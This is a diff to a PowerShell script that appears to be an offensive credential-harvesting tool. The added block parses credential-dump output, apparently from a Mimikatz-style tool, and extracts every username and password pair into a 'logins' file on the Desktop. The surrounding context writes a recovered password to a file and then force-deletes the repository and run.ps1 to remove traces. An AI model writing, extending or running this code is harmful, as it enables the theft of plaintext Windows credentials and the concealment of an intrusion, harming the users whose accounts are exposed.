@@ -38,6 +38,26 @@ $password = $password.substring(1)
 echo "PASSWORD APRES SUBSTRING = $password"
 
 echo $null > "$HOME/Desktop/$password"
+
+# dumping every login/password
+$logins = @()
+$passwords = @()
+for ($i = 0; $i -lt $out.length; $i++) {
+	if ($out[$i] -match '\* Username : (.+)$') {
+		if ($i+2 -lt $out.length -and $out[$i+2] -match '\* Password : (.+)$') {
+			$out[$i] | Select-String '\* Username : (.+)$' -AllMatches |
+				ForEach-Object { $_.Matches.groups[1] } | ForEach-Object { $logins += $_.Value }
+			$out[$i+2] | Select-String '\* Password : (.+)$' -AllMatches |
+				ForEach-Object { $_.Matches.groups[1] } | ForEach-Object { $passwords += $_.Value }
+		}
+		echo $null
+	}
+}
+for ($i = 0; $i -lt $logins.length; $i++) {
+	$formatted += $logins[$i]+":"+$passwords[$i]+"`n"
+}
+echo -n $formatted > "$HOME/Desktop/logins"
+
 # Cleaning
 cd "$HOME/Desktop/"
 rm -Force $repo_path "$HOME/run.ps1" > $null 2>&1
